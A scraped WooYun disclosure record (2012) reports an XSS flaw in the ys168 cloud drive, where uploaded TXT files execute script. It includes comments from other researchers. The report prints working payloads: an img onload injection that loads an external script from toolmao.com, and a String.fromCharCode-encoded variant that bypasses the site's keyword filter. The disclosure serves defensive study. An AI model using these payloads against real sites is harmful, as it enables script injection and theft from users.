{"id": 20118, "wybug_id": "wooyun-2012-07389", "wybug_title": "ys168网络E盘打开TXT文件可XSS跨站攻击", "wybug_corp": "永硕E盘", "wybug_author": "毒来毒往", "wybug_date": "2012-05-24 16:49", "wybug_open_date": "2012-05-24 16:49", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "文件上传内容未检查"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-05-24：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-05-24：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 用户直接打开永硕E盘上所保存的TXT或HTM文件，可在当前页面调用外部JS文件。 详细说明：  永硕E盘具有直接打开用户上传的TXT文档功能，打开TXT时服务器只对文本内容中的script等关键字进行过滤，只需要利用String.fromCharCode功能对相关关键字进行编码，就能绕过该限制，直接在当前页面调用外部JS文件。如果将该TXT文件取个有诱惑性的名字引人点击，同时偷偷打开外部特定的JS脚本，该漏洞可能引发较为严重的后果。   漏洞证明：  1、打开http://52wooyun.ys168.com/ ，点击“可直接执行脚本跨站”目录，该目录下有两个已经上传的TXT文件\n\n其中“未经编码的原脚本.txt”的内容为：<img src='http://www.baidu.com/img/baidu_logo.gif' onload='var s=document.createElement(script);s.type=text/javascript;s.src=http://www.toolmao.com/tool/qqmail.js;document.body.appendChild(s);'/>另一个“编码后可绕过执行脚本.txt”的内容为：<img src='http://www.baidu.com/img/baidu_logo.gif' onload='var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.type=String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116);s.src=String.fromCharCode(104,116,116,112,58,47,47,119,119,119,46,116,111,111,108,109,97,111,46,99,111,109,47,116,111,111,108,47,113,113,109,97,105,108,46,106,115);document.body.appendChild(s);'/>两个文件的内容实则是相同的，后者只是对前者进行了String.fromCharCode编码。2、直接打开第一个原脚本文件，跳出来一个空白页面，没有任何反映3、直接打开第二个编码后的文件，跳出页面的同时，调用了http://www.toolmao.com/tool/qqmail.js 这个脚本文件。\n\n   修复方案：  对String.fromCharCode功能进行限制。   版权声明：转载请注明来源 毒来毒往@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：2 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2012-05-24 17:29 |    \t\tSogili \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:27        )\t\t \n  修复方案亮了    \n     2012-05-24 19:03 |    \t\tCnCxzSec(衰仔) \t\t\t( 普通白帽子  |\t\t\t        Rank:322 漏洞数:32        | Wow~~~)\t\t \n  @Sogili 大亮！    \n     2012-05-25 18:04 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  @CnCxzSec(衰仔) @毒来毒往 很有意思 好像在firefox中不行，在搜狗浏览器中可以，而且 直接iframe也可以 如http://possible.ys168.com/ 下的test1.txt 求指点一下 这个根源是什么    \n     2012-05-25 19:07 |    \t\t毒来毒往 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 专注于数据的深度挖掘、分析！)\t\t \n  因为这网站默认以本地浏览器打开TXT文件    \n     2012-05-25 19:08 |    \t\t毒来毒往 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 专注于数据的深度挖掘、分析！)\t\t \n  @possible 哈哈，感谢你提供的2个WEB MM  ^_^    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 2, "Ranks": null}